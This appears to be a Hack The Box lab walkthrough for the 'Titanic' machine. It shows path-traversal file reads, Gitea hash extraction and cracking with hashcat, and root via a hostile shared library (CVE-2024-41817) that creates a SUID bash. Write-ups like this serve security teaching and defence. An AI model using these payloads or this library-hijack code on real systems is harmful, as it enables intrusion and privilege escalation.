# Titanic — Hack The Box Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Titanic-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
</p>

## Machine Information

- **Machine:** Titanic
- **Platform:** Hack The Box
- **IP:** `<IP_Machine>`

---

# Table of Contents

1. [TL;DR](#tldr)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration & Exploitation](#enumeration--exploitation)
   - [Path Traversal — Reading Arbitrary Files](#path-traversal--reading-arbitrary-files)
   - [Discovering the Gitea Instance](#discovering-the-gitea-instance)
   - [Extracting and Cracking the Gitea Password Hash](#extracting-and-cracking-the-gitea-password-hash)
   - [SSH Access as developer](#ssh-access-as-developer)
4. [Privilege Escalation](#privilege-escalation)
5. [Flags](#flags)
6. [Lessons Learned](#lessons-learned)
7. [References](#references)
8. [Conclusion](#conclusion)

---

# TL;DR

- A Flask web application exposes a **path traversal vulnerability** in its `/download` endpoint, allowing arbitrary file reads.
- Reading `/etc/hosts` reveals a hidden **Gitea** instance at `dev.titanic.htb`.
- The Gitea configuration file (`app.ini`) is retrieved via the same path traversal, pointing to a **SQLite database** containing a PBKDF2-SHA256 password hash.
- The hash is cracked offline with **hashcat** and **rockyou.txt**, yielding the `developer` account password and SSH access.
- A root-owned cron script runs `magick identify *.jpg` in a directory writable by `developer`, making it vulnerable to **CVE-2024-41817** (ImageMagick shared library hijacking via `CWD`).
- A malicious `libxcb.so.1` planted in that directory is loaded by `magick` as root, producing a **SUID bash** that grants the root flag.

---

# Reconnaissance

The initial port scan reveals a minimal attack surface: only two ports are open.

```
22/tcp  open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp  open  http  Apache httpd 2.4.52
```

The HTTP response banner (`Werkzeug/3.0.3 Python/3.10.12`) immediately tells us something important: although Apache is the front-facing server, the back-end is a **Python/Flask application**. This is worth keeping in mind — Flask applications sometimes expose debug routes or implement custom file-serving logic that is prone to path traversal.

SSH is running a recent-enough version of OpenSSH that direct exploitation is unlikely; the web application is the obvious entry point.

---

# Enumeration & Exploitation

## Path Traversal — Reading Arbitrary Files

Browsing the web application reveals a ticket-booking interface. The download mechanism for booking confirmations is backed by a `/download` endpoint that accepts a `ticket` parameter representing a file path. Testing a basic traversal sequence immediately confirms the vulnerability:

```
http://<IP_Machine>/download?ticket=../../../etc/passwd
```

The server returns the contents of `/etc/passwd` without any sanitisation — a classic **path traversal (LFI)** flaw.

The next logical step is to understand the application's own source code. Since the server banner identifies a Flask process, reading `/proc/self/cwd/app.py` (the current working directory of the running process) reveals the source and confirms the application root is `/opt/app`.

With arbitrary file read confirmed, the first high-value target is the user flag, which turns out to be world-readable:

```
http://<IP_Machine>/download?ticket=../../../home/developer/user.txt
```

This yields the **user flag** directly — but we still need a real shell to go further.

## Discovering the Gitea Instance

Reading `/etc/hosts` via the same traversal uncovers a virtual-host entry that is not advertised anywhere on the main site:

```
127.0.0.1   titanic.htb   dev.titanic.htb
```

Adding `dev.titanic.htb` to our local `/etc/hosts` file (pointing to `<IP_Machine>`) and sending an HTTP request with the appropriate `Host` header exposes a **Gitea** instance. A public repository named `developer/docker-config` is accessible without authentication. It contains a `mysql/docker-compose.yml` file with database credentials (`MySQLP@$$w0rd!` for root, `sql_password` for `sql_svc`), but these do not unlock SSH access directly.

More importantly, the repository's existence confirms that the `developer` user operates this Gitea instance — and that the Gitea data directory is likely under their home folder.

## Extracting and Cracking the Gitea Password Hash

Gitea's main configuration file is `app.ini`. Using the path traversal to read the default Gitea config path:

```
http://<IP_Machine>/download?ticket=../../../home/developer/gitea/custom/conf/app.ini
```

The file reveals two critical pieces of information:

1. The database backend is **SQLite**, stored at `/home/developer/gitea/data/gitea/gitea.db`.
2. Various secrets (JWT, LFS) that confirm this is a live, configured instance.

The SQLite database itself is a binary file, but the path traversal has no restriction on file type — downloading it directly works:

```
http://<IP_Machine>/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db
```

Opening the database locally and querying the `user` table yields the `developer` account's hashed password. The hash algorithm is identified as **PBKDF2-SHA256** (`PASSWORD_HASH_ALGO = pbkdf2`).

The hash is fed to **hashcat** in the appropriate format against `rockyou.txt`:

```bash
hashcat -m 10900 developer_hash.txt /usr/share/wordlists/rockyou.txt
```

The password cracks quickly: **`25282528`**.

## SSH Access as developer

With valid credentials in hand, SSH login succeeds:

```bash
ssh developer@<IP_Machine>
# Password: 25282528
```

We now have an interactive shell as `developer`.

---

# Privilege Escalation

## CVE-2024-41817 — ImageMagick Shared Library Hijacking

Enumerating the system as `developer`, a notable script stands out at `/opt/scripts/identify_images.sh`, executed periodically by root:

```bash
cd /opt/app/static/assets/images && magick identify *.jpg
```

Two properties of this setup make it exploitable:

1. **The working directory is writable by `developer`.** The `/opt/app/static/assets/images` directory has permissions `drwxrwx---` with ownership `root:developer`, so our user can create files there.
2. **ImageMagick 7.1.1-35 loads `libxcb.so.1` from the current working directory** before system library paths. This is the behaviour described in **CVE-2024-41817**: a shared library hijacking vulnerability where `magick` resolves certain libraries relative to `CWD`, allowing an attacker who controls that directory to execute arbitrary code in the context of whoever runs `magick` — in this case, **root**.

The exploit is straightforward. First, write a malicious C shared library:

```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void pwn() {
    system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash");
}
```

Compile it as a shared object named `libxcb.so.1` and drop it into the target directory:

```bash
gcc -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 evil.c
```

When the cron job next fires and root executes `magick identify *.jpg` from that directory, `magick` loads our `libxcb.so.1` instead of the legitimate system library. The constructor function runs as root, copying `/bin/bash` to `/tmp/bash` and setting the SUID bit on it.

Once `/tmp/bash` appears:

```bash
/tmp/bash -p -c "cat /root/root.txt"
```

The `-p` flag preserves the effective UID (root), and the root flag is printed.

---

# Flags

- **user.txt**: `REDACTED`
- **root.txt**: `REDACTED`

---

# Lessons Learned

1. **Never trust user-supplied file paths.** The `/download?ticket=` parameter passed filenames directly to the filesystem without sanitisation. Input validation — rejecting path separators, resolving the canonical path and asserting it falls within an allowed directory — would have blocked the entire attack chain at its very first step.

2. **Virtual hosts must be treated as part of the attack surface.** The Gitea instance was only reachable via a specific `Host` header, but it was still network-accessible from the outside. Internal services that are not intended to be public should be bound to loopback interfaces or protected by network-level controls, not merely hidden by obscurity.

3. **Sensitive data in SQLite databases deserves the same protection as SQL servers.** The Gitea database was readable by the web process (indirectly) because the path traversal had no scope restriction. Ensuring that application data directories are not readable by the web-serving user, and that the web user cannot reach arbitrary filesystem paths, limits the blast radius of such vulnerabilities.

4. **Weak passwords defeat strong hashing algorithms.** PBKDF2-SHA256 is a sound algorithm, but it cannot protect the password `25282528` against a rockyou dictionary attack. Enforcing a minimum password complexity policy would have broken this link in the chain.

5. **CWD-based library loading is a privilege escalation primitive.** CVE-2024-41817 demonstrates that running a binary as a privileged user from a directory writable by a lower-privileged user is inherently dangerous when that binary performs relative library resolution. The fix is either to run such scripts from a root-owned, non-writable working directory, or to ensure the installed version of ImageMagick is patched against this CVE.

---

# References

- [CVE-2024-41817](https://nvd.nist.gov/vuln/detail/CVE-2024-41817) — ImageMagick: shared library hijacking via current working directory

---

# Conclusion

Titanic is an excellent introductory machine that chains three conceptually distinct vulnerability classes into a clean, end-to-end compromise. The path traversal vulnerability provides not just direct file read access (yielding the user flag immediately) but also the reconnaissance primitives needed to discover a hidden service and extract database credentials. Password cracking bridges the gap to a real shell, and a well-known but often-overlooked ImageMagick behaviour — loading shared libraries from the current working directory — closes the loop to root. The machine reinforces a core security principle: a single unvalidated input can serve as the skeleton key for an entire system.